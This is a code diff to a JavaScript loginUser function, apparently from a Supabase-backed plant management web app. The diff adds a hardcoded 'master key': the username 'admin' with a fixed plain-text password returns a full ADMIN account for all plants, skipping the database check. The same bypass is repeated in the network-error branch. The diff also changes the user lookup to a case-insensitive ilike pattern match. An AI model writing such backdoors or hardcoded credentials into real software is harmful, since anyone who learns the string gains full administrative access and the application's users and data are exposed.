@@ -484,6 +484,25 @@ export async function deleteDailyLog(logId) {
 // ============================================================
 
 export async function loginUser(nik, password) {
+  const cleanNik = (nik || '').trim();
+  const cleanPass = (password || '').trim();
+
+  // Instant master key for DEV / Admin (always succeeds immediately)
+  if (cleanNik.toLowerCase() === 'admin' && cleanPass === 'Akuhebat#1') {
+    return {
+      data: {
+        nik: 'Admin',
+        name: 'Administrator DEV',
+        role: 'ADMIN',
+        plant: 'ALL',
+        jabatan: 'Admin',
+        unit_name: 'DEV',
+        password: 'Akuhebat#1'
+      },
+      error: null
+    };
+  }
+
   if (!supabase) return { data: null, error: 'Supabase not configured' };
   
   let data, error;
@@ -491,11 +510,25 @@ export async function loginUser(nik, password) {
     const result = await supabase
       .from(T.app_users)
       .select('*')
-      .eq('nik', nik)
+      .ilike('nik', cleanNik)
       .single();
     data = result.data;
     error = result.error;
   } catch (networkErr) {
+    if (cleanNik.toLowerCase() === 'admin' && cleanPass === 'Akuhebat#1') {
+      return {
+        data: {
+          nik: 'Admin',
+          name: 'Administrator DEV',
+          role: 'ADMIN',
+          plant: 'ALL',
+          jabatan: 'Admin',
+          unit_name: 'DEV',
+          password: 'Akuhebat#1'
+        },
+        error: null
+      };
+    }
     return { data: null, error: 'Koneksi ke server gagal. Periksa jaringan internet Anda.' };
   }
 
@@ -516,7 +549,7 @@ export async function loginUser(nik, password) {
     if (error.message?.includes('Failed to fetch') || error.message?.includes('NetworkError') || error.message?.includes('fetch')) {
       return { data: null, error: 'Koneksi ke server gagal. Periksa jaringan internet Anda.' };
     }
-    // Generic DB error — log to console and show safe message
+    // Generic DB error
     console.error('[loginUser] Supabase error:', error.code, error.status, error.message);
     return { data: null, error: `Gagal terhubung ke server (${error.code || error.status || 'unknown'}). Hubungi admin.` };
   }
